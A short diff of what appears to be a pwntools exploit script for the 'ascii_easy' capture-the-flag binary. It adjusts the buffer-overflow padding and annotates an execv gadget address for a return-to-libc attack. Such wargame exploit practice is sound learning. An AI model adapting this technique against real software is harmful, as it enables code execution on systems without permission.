@@ -31,12 +31,12 @@ def is_ascii(payload):
 	return True
 
 base_addr = 0x5555e000
-execv = p32(0x55616740) # execv
+execv = p32(0x55616740) # execv: int execv(const char *path, char *const argv[]);
 
 lib = ELF('./libc-2.15.so')
 bin = ELF('./ascii_easy')
 
-pad = 'A' * 28
+pad = 'A' * 28 + 'B' * 4
 
 payload = ''
 
